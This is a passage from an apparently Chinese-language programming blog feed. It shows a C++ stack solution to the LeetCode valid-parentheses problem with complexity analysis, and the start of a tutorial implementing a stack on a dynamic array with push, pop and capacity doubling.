class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">        <span class="comment">//check empty string</span></span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;;</span><br><span class="line">        <span class="comment">// iterate over the string</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c: s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                        sk.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                        sk.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                        sk.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>初始化一個 char type 的stack</li><li>首先判斷是否是空字串，如果字串是空的，直接回傳false</li><li>接著透過一個 for 迴圈來迭代字元，如果遇到任意左括號像是 <code>[</code>、<code>(</code>、 <code>&#123;</code> 則將其 push到 stack中</li><li>接著個別處理各種右括號的狀況，如果遇見 <code>)</code>，則先判斷是否 stack為空，如果為空直接回傳 false</li><li>如果 stack 中的頂端元素為相對應的 <code>(</code>，則將stack元素，pop出來，如果不是 <code>(</code> 則回傳false</li><li>其餘兩類的括號也是同樣處理</li><li>迴圈結束後，檢查stack是否為空，如果是空的那就代表字串是valid，反之則invalid</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/20/results1.png"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    stack&lt;<span class="type">char</span>&gt; sk;</span><br><span class="line">    <span class="keyword">if</span>(s == <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;;</span><br><span class="line">    <span class="comment">// iterate over the string</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> c: s)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">            sk.<span class="built_in">push</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span> ( sk.<span class="built_in">top</span>()==<span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Is it valid?: &quot;</span> &lt;&lt; <span class="built_in">isValid</span>(str) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>遍歷字串：程式碼遍歷整個輸入字串 s，這是一個線性操作，時間複雜度為 $O(N)$，其中 $N$ 是字串的長度</li><li>堆疊操作：在遍歷過程中，對堆疊進行的操作（push 和 pop）均是常數時間操作，時間複雜度為 $O(1)$<br>綜合來看，整體時間複雜度為：$O(N)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>程式碼中使用了一個堆疊來儲存左括號，堆疊的空間複雜度取決於未匹配的左括號數量，最壞狀況就是所有的括號都會被壓入棧中</p><p>這樣的話，空間複雜度將是 $O(N)$，$N$為括號數量，其餘變數都是常數別操作，因此整體空間複雜度會是 $O(N)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 堆疊 (Stack) | LeetCode 筆記</title>
      <link href="/posts/a27c9492.html"/>
      <url>/posts/a27c9492.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是-Stack"><a href="#甚麼是-Stack" class="headerlink" title="甚麼是 Stack?"></a>甚麼是 Stack?</h1><p>Stack 是一種資料結構，具有 <strong>後進先出(Last-In-First-Out, LIFO)</strong> 的特性，</p><p><img src="/img/LeetCode/stack/stack.png"></p><h1 id="Stack-實作-C"><a href="#Stack-實作-C" class="headerlink" title="Stack 實作 (C++)"></a>Stack 實作 (C++)</h1><p>這裡我想透過 C++ 去時做一個完整的 Stack 功能，並且實踐常見的 <code>push</code>, <code>pop</code>, <code>isEmpty</code> 等等操作</p><h2 id="用-Array-實作-Stack"><a href="#用-Array-實作-Stack" class="headerlink" title="用 Array 實作 Stack"></a>用 Array 實作 Stack</h2><p>再透過C++ 實作Stack得時候，需要注意某些變數不能被外部存取，像是</p><ul><li><code>top</code>: 用於指向stack 的頂端，也就是最上面的index</li><li><code>capacity</code>: stack的記憶體大小</li><li><code>*stack</code>:  指向stack的指標</li></ul><p>因此與上面相關的變數需要作為 Private 的成員變數。另外再使用陣列實踐Stack的時候有時候會出現，記憶體不夠的狀況，因此可以透過建立一個自動擴展capacity的函數來解決。</p><p>另外，在實作Pop的時候，<strong>並不需要將資料實際移除，而是將 <code>top</code> 扣掉1，好像是我們真的把資料從stack刪除一樣，但實際上並沒有，而是在未來Push的時候再將現有資料蓋過去即可，這樣的做法可以節省記憶體操作成本</strong></p><p><img src="/img/LeetCode/stack/pop.png"></p><blockquote><p>注意: 在進行Pop或者是 Top操作(回傳現在Stack最頂端資料值)前都需要先判斷 Stack是否為空，<code>st.empty()</code></p></blockquote><h3 id="完整程式碼"><a href="#完整程式碼" class="headerlink" title="完整程式碼"></a>完整程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StackArray</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> top; <span class="comment">//Index of top element of Stack</span></span><br><span class="line">        <span class="type">int</span> capacity; <span class="comment">// Allocated memory</span></span><br><span class="line">        <span class="type">int</span> *stack;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">DoubleCapacity</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// Define constructor with initial state: top=-1, capacity=1</span></span><br><span class="line">        <span class="built_in">StackArray</span>():<span class="built_in">top</span>(<span class="number">-1</span>),<span class="built_in">capacity</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//Init a int array with capacity=1</span></span><br><span class="line">            stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">getSize</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::DoubleCapacity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Double capacity</span></span><br><span class="line">    capacity = capacity *<span class="number">2</span>;</span><br><span class="line">    <span class="comment">// Reallocate memory</span></span><br><span class="line">    <span class="type">int</span> *new_stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy elements to new stack</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; capacity/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        new_stack[i] = stack[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free memory, this is used to free memory that allocated by new[]</span></span><br><span class="line">    <span class="keyword">delete</span>[] stack;  </span><br><span class="line">    <span class="comment">// redrect new_stack to stack</span></span><br><span class="line">    stack = new_stack;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == capacity<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">DoubleCapacity</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    stack[++top] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing to pop!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//update top</span></span><br><span class="line">    top--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">StackArray::isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(top == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return top element of stack</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::Top</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Empty Stack, nothing on the top!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stack[top];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackArray::getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    StackArray sk;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">14</span>);</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">9</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">Push</span>(<span class="number">7</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line">    sk.<span class="built_in">Pop</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\n top: &quot;</span> &lt;&lt; sk.<span class="built_in">Top</span>() &lt;&lt; <span class="string">&quot;\nsize: &quot;</span> &lt;&lt; sk.<span class="built_in">getSize</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>執行結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Empty Stack, nothing to pop!</span><br><span class="line">top: 9</span><br><span class="line">size: 2</span><br><span class="line"></span><br><span class="line">top: 7</span><br><span class="line">size: 3</span><br><span class="line"></span><br><span class="line">top: 14</span><br><span class="line">size: 1</span><br><span class="line">Empty Stack, nothing on the top!</span><br><span class="line"></span><br><span class="line">top: -1</span><br><span class="line">size: 0</span><br></pre></td></tr></table></figure><h3 id="程式碼說明"><a href="#程式碼說明" class="headerlink" title="程式碼說明"></a>程式碼說明</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StackArray</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> top; <span class="comment">//Index of top element of Stack</span></span><br><span class="line">        <span class="type">int</span> capacity; <span class="comment">// Allocated memory</span></span><br><span class="line">        <span class="type">int</span> *stack;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">DoubleCapacity</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// Define constructor with initial state: top=-1, capacity=1</span></span><br><span class="line">        <span class="built_in">StackArray</span>():<span class="built_in">top</span>(<span class="number">-1</span>),<span class="built_in">capacity</span>(<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">//Init a int array with capacity=1</span></span><br><span class="line">            stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(<span class="type">int</span> x)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">Top</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span>  <span class="title">getSize</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我們透過建立一個 StackArray Class 來去定義Stack 本身以及相應的操作，其中在初始化方面，我們透過constructor <code>StackArray</code> (建構子會與class名稱一樣) 來去初始化 private成員變數 <code>top=-1</code>, <code>capacity=1</code>，並且宣告一個新的記憶體空間，是一個大小為 <code>capacity</code> 的整數陣列，並且透過指標 <code>stack*</code> 指向該陣列。</p><p>接著再 Public 區域就宣告了我們之後會對Stack 進行的各種操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::DoubleCapacity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Double capacity</span></span><br><span class="line">    capacity = capacity *<span class="number">2</span>;</span><br><span class="line">    <span class="comment">// Reallocate memory</span></span><br><span class="line">    <span class="type">int</span> *new_stack = <span class="keyword">new</span> <span class="type">int</span>[capacity];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy elements to new stack</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; capacity/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        new_stack[i] = stack[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// free memory, this is used to free memory that allocated by new[]</span></span><br><span class="line">    <span class="keyword">delete</span>[] stack;  </span><br><span class="line">    <span class="comment">// redrect new_stack to stack</span></span><br><span class="line">    stack = new_stack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DoubleCapacity</code> 這個函數主要會去將 <code>capacity</code> 乘上2，然後定義具有雙倍capacity的新stack，再將舊stack的資料都複製到新的，接著把舊stack的陣列記憶體空間釋放，並且更新指標。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackArray::Push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (top == capacity<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">DoubleCapacity</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    stack[++top] = x;</span><br><span 